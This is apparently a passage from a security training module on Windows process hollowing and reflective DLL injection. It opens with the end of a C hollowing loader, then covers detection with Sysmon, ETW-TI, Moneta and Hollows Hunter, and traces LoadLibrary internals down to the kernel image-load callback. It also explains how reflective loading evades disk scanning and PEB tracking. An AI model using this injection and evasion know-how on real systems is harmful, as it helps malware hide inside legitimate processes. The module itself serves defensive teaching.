    printf("[+] New thread context (updated entry point). . .\n");
    printf("\nPress enter to resume thread now. . .\n");
    getchar();

    NtResumeThread(pi.hThread, NULL);
    NtWaitForSingleObject(pi.hProcess, FALSE, NULL);

    NtClose(pi.hThread);
    NtClose(pi.hProcess);

    if (localImage) {
        VirtualFree(localImage, 0, MEM_RELEASE);
        printf("[+] Process Hollowing Successful. Press <ENTER> to close\n");
        getchar();
    }
    else {
        printf("Error: %lu\n", GetLastError());
    }
    return 0;
}

```

* * *

In the next section, we will showcase a demo of this technique and explore the detection opportunities.


# Demo and Detections

Let's navigate to the bottom of this section and click on " `Click here to spawn the target system!`". Then, let's RDP into the Target IP using the provided credentials. The mentioned tools (inclduing WinDbg) are installed on the target system and the shortcut files are created on the desktop. The vast majority of the actions/commands covered from this point up to end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Within the target (VM), we can locate the samples and tools at the following paths:

- **Process Hollowing tool**: `C:\injection\hollow\hollow.exe`
- **Replacement image**: `C:\injection\hollow\hollow_replace.exe`
- **Hollow**: `C:\injection\hollow\demo\Hollow.exe`
- **Kiwi**: `C:\injection\hollow\demo\kiwi.exe`
- **ProcessHacker**: `C:\injection\tools\ProcessHacker\ProcessHacker.exe`
- **Hollows hunter**: `C:\injection\tools\hollows_hunter64.exe`
- **Sealighter-TI (for ETW-Ti events)**: `C:\tools\SealighterTI.exe`
- **Moneta**: `C:\Tools\Moneta64.exe`

* * *

## Demo of Process Hollowing

The screenshot below shows a demo program that uses this technique to hollow out the original image and replace it with a malicious image. The executable, `hollow.exe`, launches `sc.exe` as suspended and gets its image base address. Next, the memory is unmapped, and the new entry point is replaced with `hollow_replace.exe`.

![ProcessHollow](https://academy.hackthebox.com/storage/modules/266/hollow_image-11-3.png)

These two files are saved on the target system in the following location:

- **Process Hollowing tool**: `C:\injection\hollow\hollow.exe`
- **Replacement image**: `C:\injection\hollow\hollow_replace.exe`

This is where Sysmon's [Process Tampering](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=90025) event helps detect this activity under Event ID 25:

![ProcessHollow](https://academy.hackthebox.com/storage/modules/266/hollow_image-12.png)

ETW-TI can also detect the memory allocation and thread context modification activites:

![ProcessHollow](https://academy.hackthebox.com/storage/modules/266/hollow_image-13.png)

When the new thread context is set, it is captured in the ETW-TI events:

![ProcessHollow](https://academy.hackthebox.com/storage/modules/266/hollow_image-14.png)

To design detections for this technique, it is important to understand the steps: first, a remote process is launched in a suspended state, then its memory is unmapped using the `NtUnmapViewOfSection` function, and memory allocation is done. Finally, the thread context is set.

## Detection using Moneta

[Moneta](https://github.com/forrest-orr/moneta) uses indicators such as a non-image primary image base, a few abnormal private memory regions, and a missing PEB module to detect process hollowing by identifying anomalies in the process's memory layout and module tracking. The presence of executable code in unbacked memory regions and inconsistencies in the PEB are red flags for security analysts, signaling that a process may have been hollowed and is executing malicious code under the guise of a legitimate process.

### Non-image Primary Image Base

A non-image primary image base refers to the detection of executable code in a memory region that is not backed by a legitimate image file on disk (e.g., EXE or DLL). In the scenario of process hollowing:

- `Creation of Suspended Process`: A new process is created in a suspended state using a legitimate executable.
- `Hollowing the Process`: The loader then unmaps the original executable code from the process's memory.
- `Injecting Malicious Code`: New memory is allocated in the hollowed process, and the malicious executable code is written into this memory region. This new memory region is not backed by a legitimate image file.

`Moneta` flags this scenario as a non-image primary image base because the primary executable code for the process is now in a memory region that wasn’t loaded from an image file on disk, indicating potential process hollowing.

![ProcessHollow](https://academy.hackthebox.com/storage/modules/266/ph-moneta.png)

### Missing PEB Module

The Process Environment Block (PEB) keeps track of all the modules (executables and DLLs) loaded in a process. In this scenario, there were activities such as manipulation of the entrypoint. The process contains an EXE image whose base address does not have an entry in the PEB. If an attacker injects code that is not updated in the PEB to reflect this new module, Moneta will detect that expected modules are missing from the PEB. When Moneta finds discrepancies between the loaded modules, it flags this as a missing PEB module. This is a strong indicator that process hollowing may have occurred, as the legitimate module information is missing or tampered with.

We can use [Hollows Hunter](https://github.com/hasherezade/hollows_hunter) to detect process hollowing and related activities.

![ProcessHollow](https://academy.hackthebox.com/storage/modules/266/ph-hunter.png)


# Intro to Reflective Code injection

Reflective Code injection refers to the process of loading code directly from memory, bypassing the disk and static detection rules (such as YARA rules or signature-based detections). Reflective DLL injection is a technique used to inject a DLL into a process without relying on the traditional methods provided by the Windows operating system. Unlike typical DLL injection techniques that involve using functions like `LoadLibrary()`, this injection technique does not rely on this function. Instead, it uses a `custom reflective loader` to handle the module loading, allowing the DLL to map itself into memory without using the standard Windows loader.

## How Reflective Code Injection Works

- `No Windows Loader`: Traditional injections rely on the Windows loader, which updates structures like the PEB (Process Environment Block) and registers the module in the loader's linked list (LDR), making the detection easy for security tools.
- `Reflective Loader`: The injected code contains its own loader, which parses and loads the PE file into memory manually, updating necessary headers and resolving imports. This process skips PEB updates, making detection harder.

## Windows Loader vs Reflective Loader

| Aspect | Windows Loader | Reflective Loader |
| --- | --- | --- |
| `PEB Update` | Updates PEB structures (visible to EDR) | Skips or forges PEB updates (stealthy) |
| `Module Registration` | Registers in InLoadOrderModuleList | Does not register in loader-linked lists |
| `Import Resolution` | Uses Windows import resolution | Manually resolves imports |
| `Detection` | Easier to detect by enumerating modules or Sysmon | Harder to detect due to "non-image" memory regions |

According to [MITRE](https://attack.mitre.org/techniques/T1055/001/), the following adversaries have used the Reflective DLL injection technique:

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image.png)

* * *

## Background

In a normal scenario, when we need to load a DLL, we call the [LoadLibraryA](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) function. Let's look at the parameters required by the `LoadLibraryA` function. The `lpLibFileName` parameter refers to the name of the module, which could be either a library module (a `.dll` file) or an executable module (a `.exe` file).

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-1.png)

For instance, if we perform a normal DLL injection in a remote process, we allocate space in the remote process for the DLL's path (e.g., " `C:\test\demo.dll`"). Then, the path of the DLL is written into the remote process's memory. Next, we instruct the remote process to load the DLL by calling the `LoadLibrary()` function. As we know, `LoadLibrary()` accepts the path to the DLL as a parameter. Then, `LoadLibrary()` maps the DLL into the remote process's address space.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-45_.png)

When a DLL is injected like this, the location and name of the DLL will be revealed from the loaded modules, which is not a ideal for attackers.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-46.png)

Some points to note related to `LoadLibrary()`:

- LoadLibrary() `requires a DLL file on the disk`, which is easily detected.
- If the DLL is loaded using the `LoadLibrary()` function, the `DLL location will be revealed from the loaded modules`, which is not a good thing for attackers.
- Core DLLs of Windows, such as `Kernel32.dll`, load at the same address for all processes in the same boot session. If we use `GetProcAddress()` to get the address of the function `LoadLibrary()` inside `Kernel32.dll` like this: `GetProcAddress(GetModuleHandle("Kernel32"), "LoadLibraryA")` in Process 1, it will have the same virtual address inside Process 2.
- `LoadLibrary()` will resolve DLL path, check if DLL is already loaded, and allocate memory for the DLL in the process's address space.
- The DLL file is read from disk into the allocated memory. Necessary relocations are performed, and the module's import address table (IAT) is updated to resolve its imported functions.
- After the DLL is loaded and initialized, Windows calls its entry point function ( `DllMain`) with the `DLL_PROCESS_ATTACH` reason code.
- Finally, `LoadLibrary()` returns a handle to the loaded module, which can be used in subsequent calls to functions like `GetProcAddress()` to obtain pointers to functions within the DLL.

If the malicious DLL is present on the disk, it can be scanned by AV solutions and flagged instantly. That's why adversaries prefer to use the Reflective Code Injection technique to manually load and map the DLL into memory without relying on the standard Windows DLL loading mechanisms. The main advantage of using reflective DLL injection for attackers is that the DLL is not on disk, unlike classic DLL injection.

In the reflective DLL injection technique, the DLL never touches the disk and is loaded directly from memory. Suppose a scenario where malware downloads the DLL file from the internet and doesn't store it on disk. The downloaded DLL file resides in the memory of the attacker-controlled process. It then loads it directly from memory to the local or target process.

* * *

In the next section, we will showcase a deep dive into `LoadLibrary()`, and then we will demonstrate the custom reflective loader.


# Deep dive into LoadLibrary

In this section, we will understand the internals behind the workings of `LoadLibrary()` and how it is detected. Later, we will explore how reflected DLL injection bypasses the use of `LoadLibrary()` by creating a minimal loader to load a DLL directly into memory without touching the disk. Let's start with a simple program that uses `LoadLibraryA()` to load a DLL:

```c
#include <stdio.h>
#include <windows.h>

int main(int argc, char* argv[]) {
    if (argc != 2) {
        printf("\nUsage: %s <DLL Path>\n", argv[0]);
        return 1;
    }
    const char* dllPath = argv[1];
    printf("[+] Press enter to load DLL %s\n", dllPath);
    getchar();
    HMODULE hHandle = LoadLibraryA(dllPath);
    if (hHandle == NULL) {
        printf("[-] Error loading library. Error code is %d\n", GetLastError());
        return 1;
    }
    printf("[+] Library loaded. Press enter to exit");
    getchar();
    FreeLibrary(hHandle);
    return 0;
}

```

After compiling the code, we can use `loadlibrary_demo.exe` and specify the DLL we created. As we can see below, it will generate alerts and be detected by Sysmon under the [Image load (Event ID 7)](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=90007) event.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-47.png)

Sysmon uses [kernel callbacks](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/callback-objects) to detect image load events. To detect image loading events, it uses the [PsSetLoadImageNotifyRoutine](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetloadimagenotifyroutine) event registration mechanism, which registers a callback for all image loading activities performed by different API functions such as `LoadLibrary()`, `ImageLoad()`, `NtMapViewOfSection()`, and so on.

## How PsSetLoadImageNotifyRoutine Works?

As per Microsoft [documentation](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetloadimagenotifyroutine), the `PsSetLoadImageNotifyRoutine` routine registers a driver-supplied callback that is subsequently notified whenever an image (for example, a `.dll` or `.exe`) is loaded or mapped into memory. The [syntax](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetloadimagenotifyroutine#syntax) for `PsSetLoadImageNotifyRoutine` is as follows:

```c
NTSTATUS PsSetLoadImageNotifyRoutine(
  [in] PLOAD_IMAGE_NOTIFY_ROUTINE NotifyRoutine
);

```

Here, `NotifyRoutine` is a pointer to the caller-implemented `PLOAD_IMAGE_NOTIFY_ROUTINE` callback routine for load-image notifications. To demonstrate this, we can subscribe to `PsSetLoadImageNotifyRoutine` notifications by defining a callback routine. The `DriverEntry` function is the entry point for the driver, and in this particular case, it simply registers the `NotifyRoutine` function as the callback routine for load image notifications. This will allow the driver to monitor the image loading events in the system. An example of this is shown in the code snippet as follows:

```c
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(DriverObject);
	UNREFERENCED_PARAMETER(RegistryPath);
	NTSTATUS status = 0;

  // subscribe to notifications
	PsSetLoadImageNotifyRoutine(NotifyRoutine);
	DbgPrint("[+] HTBDrv [Info] PsSetLoadImageNotifyRoutine callback registered\n");
	return STATUS_SUCCESS;
}

```

Then we can create the `NotifyRoutine` function, which is registered as the callback routine to be invoked by the operating system whenever a new image is loaded into any process. From this point onwards, whenever a new image is loaded into any process (either user-mode or kernel-mode), the operating system will call the NotifyRoutine function and pass the following arguments:

- `imageName`: A `UNICODE_STRING` structure containing the full path of the image being loaded.
- `pid`: A `HANDLE` representing the process ID of the process into which the image is being loaded.
- `imageInfo`: A pointer to an `IMAGE_INFO` structure containing information about the image being loaded, such as its base address, entry point, and other details.

The function would look like the following:

```c
void NotifyRoutine(PUNICODE_STRING imageName, HANDLE pid, PIMAGE_INFO imageInfo)
{
	UNREFERENCED_PARAMETER(imageInfo);
	PEPROCESS process = NULL;
	PUNICODE_STRING processName = NULL;
	UNICODE_STRING testDllName;
	WCHAR testDllNameBuffer[] = L"reflective.dll";
	USHORT imageNameLength, testDllNameLength;

	// Initialize the UNICODE_STRING for our demo dll
	RtlInitUnicodeString(&testDllName, testDllNameBuffer);

	PsLookupProcessByProcessId(pid, &process);
	SeLocateProcessImageName(process, &processName);

	// Get the lengths of imageName and our demo dll"
	imageNameLength = imageName->Length;
	testDllNameLength = testDllName.Length;

	// Check if imageName ends with reflective.dll
	if (imageNameLength >= testDllNameLength &&
		RtlCompareMemory(imageName->Buffer + (imageNameLength - testDllNameLength) / sizeof(WCHAR),
			testDllName.Buffer,
			testDllNameLength) == testDllNameLength)
	{
		DbgPrint("[+] HTBDrv [ImageLoad] Notification Event \n   - ProcessName: %wZ \n   - PID: (%d)\n   - Image loaded : %wZ\n\n", processName, pid, imageName);
	}
}

```

To reduce the noise from a lot of image load events, we have added a condition to check if the `imageName` string ends with `reflective.dll`. If the condition is met (i.e., once the `reflective.dll` image is loaded), we send a message using debug print statements specified by the [DbgPrint](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-dbgprint) routine to send a message to the kernel debugger.

To demonstrate this concept, we can use the [sc create](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc990289(v=ws.11)) command to create a service to load the sample driver ( `HTB-Drv.sys`), specifying the type as kernel to indicate a driver, and subsequently start the process:

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-41.png)

We can view the debug print statements specified by the [DbgPrint](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-dbgprint) routine. The [DebugView](https://learn.microsoft.com/en-us/sysinternals/downloads/debugview) tool from SysInternals can be used to view this debug output. This tool monitors the kernel-mode debug output on a local or remote system, or we can also use a debugger (e.g., WinDbg) to capture the debug output.

![DBGVIEW](https://academy.hackthebox.com/storage/modules/266/dbg_info.png)

Alternatively, we can use `WinDbg` to display the information about related to the debug output during the load of the driver by using the [g (Go)](https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/g--go-) command to start the program:

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-42.png)

This confirms that our driver is loaded successfully. Once we execute our `LoadLibrary()` program to load the `reflective.dll` library, we can see the notification.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-43.png)

This can be checked in the DebugView output.

![DBGVIEW](https://academy.hackthebox.com/storage/modules/266/dbg_notify.png)

In the debugger, we can view the debug print statements specified by [DbgPrint](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-dbgprint) in the `NotifyRoutine` function. This confirms that the `Image Load` notification is triggered by `PsSetLoadImageNotifyRoutine`.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-44.png)

And at the same time, we see the `Image Load` event (Event ID 7) in Sysmon logs as well.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-40.png)

## What triggers the callback?

Let's understand the trigger mechanism for the callback. When the same program is launched using the debugger, we can inspect the call stack when the image load occurs. If we launch our sample executable, `loadlibrary_demo.exe`, using WinDbg, we should be able to obtain this information.

WinDbg has [sx\*](https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/sx--sxd--sxe--sxi--sxn--sxr--sx---set-exceptions-) commands that control the action that the debugger takes when an exception occurs in the application being debugged or when certain events occur. We can utilize it to break when the `reflective.dll` module is loaded, allowing us to inspect the call stack at that point to determine when it is triggered. We will use the `sxe ld` command to break when a module is loaded.

```dos
sxe ld reflective.dll

```

After creating this event, we can use the `g` (Go) command to continue the execution and wait for the breakpoint to be hit.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-37.png)

Now, we can press Enter to load the image `reflective.dll` and trigger the image load event. When the breakpoint is hit, WinDbg will break into the debugger, and we can dump the call stack to determine what triggered the event.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-38.png)

The [k](https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/k--kb--kc--kd--kp--kp--kv--display-stack-backtrace-) command can be used to dump the call stack.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-39.png)

From the call stack, we can observe that the `LoadLibraryA()` call ultimately leads to `ntdll!NtMapViewOfSection+0x14`, which triggers the callback event. This happens because `LoadLibraryA()` internally calls `LdrpLoadDll`, which in turn leads to `NtMapViewOfSection`. The function `LdrpLoadDll` performs various operations, including mapping the DLL into memory. The mapping of the DLL into memory involves calling `NtMapViewOfSection`, which is responsible for mapping a view of a section into the address space of a process. This call stack provides us with a lot of insights into the mentioned internal functions that make up the `LoadLibrary()` function call. Understanding these nested function calls involved when `LoadLibraryA()` is called (LoadLibrary in this scenario, but in general any important functions) provides us with more insights, an understanding of underlying OS mechanisms, and also detection opportunities.

### Understanding the nested functions

The simplest way to start reversing a function call flow is by analyzing the DLL file that contains the function `LoadLibraryA()`. First, we need to identify the Dynamic Link Library (DLL), which contains its implementation. We can simply refer to the Microsoft documentation for [LoadLibraryA()](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) and check the DLL name in the [requirements](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya#requirements) and check the DLL name in the requirements section, as shown in the screenshot below.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-2.png)

After identifying the implementing DLL, we can delve into the function's inner workings. One approach is to load the DLL into a disassembler tool like IDA or Ghidra. Once `kernel32.dll` is loaded and public symbols are applied in IDA, we can access the exports tab, which displays all functions exported by the DLL. This list includes the function's name, the relative address of its implementation, and its ordinal number. By searching for `LoadLibraryA()` in the list and double-clicking on it, we can navigate to its implementation in the disassembler.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-3.png)

Once we double-click on the function name, we can see the implementation of the `LoadLibraryA()` function, where we observe that `LoadLibraryA()` is calling itself, but with the name `__imp_LoadLibraryA`. This indicates that this version of `LoadLibraryA` is not present in the current DLL ( `kernel32.dll`). Instead, this version of the function is "imported" from an external DLL.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-4.png)

To view the imported functions, we need to check the `Import Table` of `kernel32.dll`. We can click on the `Imports` tab to view it. Examining the `Import Table` of `kernel32.dll` reveals the imported version of `LoadLibraryA`. Interestingly, in this case, the importing library is not `kernel32.dll`, but rather `api-ms-win-core-libraryloader-l1-2-1`, a different library.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-5.png)

To further understand the function call hierarchy, let's examine what `api-ms-win-core-libraryloader-l1-2-1` is. The `api-ms-win-core-libraryloader-l1-2-1` component is part of the [API Sets](https://learn.microsoft.com/en-us/windows/win32/apiindex/windows-apisets). Understanding how to find the DLL where this function is redirected is important, as we will encounter them in many places during the analysis.

API sets are a mechanism introduced in Windows to simplify the management of system APIs and provide better compatibility across different versions of the operating system. They serve as an abstraction layer that separates the internal implementation details of the Windows API from the external interface exposed to applications. When an application calls a function from an API set, Windows dynamically resolves the call to the correct implementation, regardless of which DLL actually contains the function. This allows applications to remain compatible with different versions of Windows without requiring changes.

To figure it out, the simplest way is to use `Get-NtApiSet` from the [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/tree/main/NtObjectManager) PowerShell module by specifying the name of the specific component (API set):

```powershell
PS C:\> Get-NtApiSet -Name api-ms-win-core-libraryloader-l1-2-1

Name                                 HostModule     Flags
----                                 ----------     -----
api-ms-win-core-libraryloader-l1-2-2 kernelbase.dll Sealed

```

The output from the command `Get-NtApiSet` shows that the API set `api-ms-win-core-libraryloader-l1-2-1` resolves to the `kernelbase.dll` library.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-6.png)

Let's load `kernelbase.dll` in IDA, and navigate to the `Exports` tab. Searching through the list we can find the `LoadLibraryA` function:

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-7.png)

Double-click on the `LoadLibraryA` function inside `kernelbase.dll` to view its code:

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-8.png)

This function is a custom implementation of `LoadLibraryA` in `kernelbase.dll`. Initially, it appears to provide special handling for loading `twain_32.dll` and dynamically constructs the path for loading other DLLs from the Windows directory. The next call we see is that it redirects to another function, `LoadLibraryExA`, in the same DLL.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-9.png)

If we double-click on this, we can see the code inside this function. It appears to convert the ANSI string `lpLibFileName` to a Unicode string, then loads the library using its Unicode version, i.e., `LoadLibraryExW`.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-10.png)

Let's examine the code for `LoadLibraryExW`:

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-11.png)

During the analysis, we can also synchronize a Pseudocode subview in IDA, which makes understanding the code easier.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-48.png)

This reveals a call to an imported function called `LdrLoadDll`:

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-12.png)

Let's open the import table of `kernelbase.dll` to check the DLL from which it has imported the `LdrLoadDll` function. In the screenshot below, we can see that the DLL is exported by `ntdll.dll`.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-13.png)

Let's follow the same process to load `ntdll.dll` in IDA, open its export table, and search for `LdrLoadDll`. Double-click on the entry to view the function's code.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-14.png)

The function first determines how the DLL should be loaded, considering aspects such as load behavior, access rights, and checks various conditions (such as debug flags) to ensure the loading is permitted. If the conditions are met, it initializes the DLL path and calls the next function, `LdrpLoadDll`, to load the DLL.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-15.png)

The function `LdrpLoadDll` is another internal function used by the loader that first logs the state of the DLL loading process. It then preprocesses the DLL name using the `LdrpPreprocessDllName` function, which handles tasks such as resolving aliases and applying redirections. If the preprocessing is successful, it calls another internal function, `LdrpLoadDllInternal()`, to perform the further loading of the DLL.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-16.png)

The next internal function, `LdrpLoadDllInternal`, calls various functions such as `LdrpFindOrPrepareLoadingModule` and `LdrpPrepareModuleForExecution`, which prepare the module for execution, build forwarder links, pin the module if needed, and free the load context of the node. It also calls `LdrpFindKnownDll` to check whether the DLL is in the list of "KnownDlls." To view the list of known DLLs, we can query the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` registry key.

If the DLL is not already loaded, it continues to load the DLL into memory using `LdrpMapDllWithSectionHandle`.

The function `LdrpProcessWork` checks if the module has the `LDRP_LOAD_FULLPATH` flag set (bit 9 of the module's characteristics). If it does, it calls `LdrpMapDllFullPath` to map the DLL using its full path; otherwise, it calls `LdrpMapDllSearchPath` to map the DLL using the search path.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-49.png)

Let's open the `LdrpMapDllFullPath` function to see if there are any calls inside it.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-51.png)

Inside `LdrpMapDllNtFileName`, we can see that the function `NtOpenFile` is called to open a handle to the DLL file on disk. This handle is then passed to `NtCreateSection` to create a section of the module.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-52.png)

Then the internal function `LdrpMapDllWithSectionHandle` is called with the pointer to the section handle returned by the previous function, `NtCreateSection`.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-50.png)

It first calls the image loader function `LdrpMinimalMapModule`, which contains a call to the `NtMapViewOfSection` function.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-53.png)

If we double-click on the function name, it shows us that it is a syscall.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-54.png)

Until now, we have analyzed the various calls that we observed in the debugger earlier. This is how we can trace and learn more about the call stack.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-39.png)

`Note`: This is the part that triggers the callback. It means that the `PsSetLoadImageNotifyRoutine` notifies when the DLL is being mapped by the image loader.

After returning from the syscall, mapping the view, and returning from the `LdrpMinimalMapModule` function call, it continues with the full mapping process.

We are back in the `LdrpMapDllWithSectionHandle` function, where it retrieves the PE header ( `IMAGE_NT_HEADERS`) of the mapped module using `RtlImageNtHeaderEx`.

If the module is a system DLL (marked by the `IMAGE_FILE_SYSTEM` flag in the PE header), it sets up some module information directly from the PE header. If the module is not a system DLL, it acquires an exclusive lock on the module data table using a slim reader/writer (SRW) lock.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-55.png)

It then checks if the module is already loaded using `LdrpFindLoadedDllByNameLockHeld`. If it's not loaded, it inserts the module into the data table and index. If the module is already loaded, it replaces the loaded module with the new one and returns success. It processes the mapped module, logs the new DLL load, and performs further actions. Then there is a call to another loader function called `LdrpCompleteMapModule`.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-56.png)

This function retrieves the NT header from the PE header of the mapped module using `RtlpImageDirectoryEntryToDataEx`.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-57.png)

The function `RtlpImageDirectoryEntryToDataEx` helps in locating and accessing important data structures within PE files. If the PE header is successfully retrieved, the function checks the type of data to locate, for example, the import directory table entry and export directory table entry.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-58.png)

Then the loader function `LdrpRelocateImage` is called to relocate the image in memory if it is not already loaded at its preferred base address.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-59.png)

Then, after returning from the `LdrpCompleteMapModule` function, the loader function `LdrpProcessMappedModule` checks various aspects of the loaded module, ensuring its correct initialization and configuration.

* * *

### Kernel call stack

This part of the section serves as informative and is not directly related to the Reflective DLL injection technique. It showcases how to delve deep into the kernel call stack and kernel functions that take place after the syscall. Let's assume there is a scenario where we encounter a syscall, and the execution transitions into kernel mode. Inside a kernel debugger, we can still control the execution and inspect the call stack and registers.

For example, inside the `ntdll.dll` DLL, there is a loader function called `LdrpFindKnownDll`, which finds a Known DLL in the Known DLLs directory. It checks if the handle to the Known DLL directory ( `LdrpKnownDllDirectoryHandle`) is valid. Then it opens a section object for the Known DLL directory using the `NtOpenSection` function.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-21.png)

When we double-click on this function name, it doesn't show what it does. It simply indicates that it is a syscall.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-23.png)

We don't have access to the `NtOpenSection` function in this DLL now. At this point, the call transitions to kernel mode. To continue reversing further, we can load the Windows NT Operating System Kernel Executable, i.e., `ntoskrnl.exe`, in IDA and search for the `NtOpenSection` function in the functions list, and we should be able to view the implementation.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-27.png)

As seen in the above screenshot, we can view the implementation of `NtOpenSection` or any other syscalls. In the case of this code, the execution will go into `ObOpenObjectByName` and further calls `ObOpenObjectByNameEx`, `ObpCaptureObjectCreateInformation`, `SepCreateAccessStateFromSubjectContext`, `ObpLookupObjectName`, and `ObpCreateHandle`, performs access checks using `SeAccessCheck()`, opens the section, and finally, the execution is returned back to the userland function.

### Inspecting registers

Let's understand how we can inspect the values in various registers during debugging in a kernel debugger. In the debugger, we can add a breakpoint on a function such as `nt!NtOpenSection` to view the call stack.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-61.png)

Before we move ahead with debugging, let's understand a little bit about the notation `nt!NtOpenSection` for the function name.

In Windows, there are many functions with identical names but implemented by different DLLs. The technique for referencing these functions is to use the format `DLLName!FunctionName`. Here, `nt!NtOpenSection` refers to the `NtOpenSection` function within the `nt` module, which typically represents functions within the Windows NT kernel ( `ntoskrnl.exe`). In contrast, `ntdll!NtOpenSection` refers to the `NtOpenSection` function within the ntdll module, which eventually goes to a syscall.

The call stack contains addresses in this format. Another example is from Process Hacker.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-60.png)

Let's continue with the debugging. Once the breakpoint is hit, we can type `k` to view the call stack.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-26.png)

Since the debugger breakpoint is at `NtOpenSection`, we should be able to view the parameters passed to it within the registers. If we check the definition of the function [NtOpenSection()](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtOpenSection.html), we can see the parameters for this function.

```c
NTSYSAPI
NTSTATUS
NTAPI

NtOpenSection(
  OUT PHANDLE             SectionHandle,
  IN ACCESS_MASK          DesiredAccess,
  IN POBJECT_ATTRIBUTES   ObjectAttributes
);

```

We will view the values for all three parameters in the registers, i.e., `RCX`, `RDX`, and `R8`, in the kernel debugger.

- `SectionHandle`: This parameter is a pointer to a `HANDLE` variable where the function will store the handle to the opened section object.
- `DesiredAccess`: This parameter specifies the desired access rights for the section object. It is an `ACCESS_MASK` value that defines the requested access permissions. It is a combination of the section access values defined in the `winnt.h` header.

```c
#define SECTION_QUERY 0x0001
#define SECTION_MAP_WRITE 0x0002
#define SECTION_MAP_READ 0x0004
#define SECTION_MAP_EXECUTE 0x0008
#define SECTION_EXTEND_SIZE 0x0010
#define SECTION_MAP_EXECUTE_EXPLICIT 0x0020

```

- `ObjectAttribute`: This parameter is a pointer to an OBJECT\_ATTRIBUTES structure that specifies the attributes of the section object to be opened, such as its name and security descriptor.

```c
0: kd> dt nt!_OBJECT_ATTRIBUTES
   +0x000 Length           : Uint4B
   +0x008 RootDirectory    : Ptr64 Void
   +0x010 ObjectName       : Ptr64 _UNICODE_STRING
   +0x018 Attributes       : Uint4B
   +0x020 SecurityDescriptor : Ptr64 Void
   +0x028 SecurityQualityOfService : Ptr64 Void

```

The `dt` command displays information about a local variable, global variable, or data type. This can display information about simple data types, as well as structures and unions. In the debugger, we can type the command `dt nt!_OBJECT_ATTRIBUTES` to view its information.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-24.png)

In case of x64 architecture, the parameters go to `RCX`, `RDX`, `R8`, and `R9` registers, and the rest are placed on the stack.

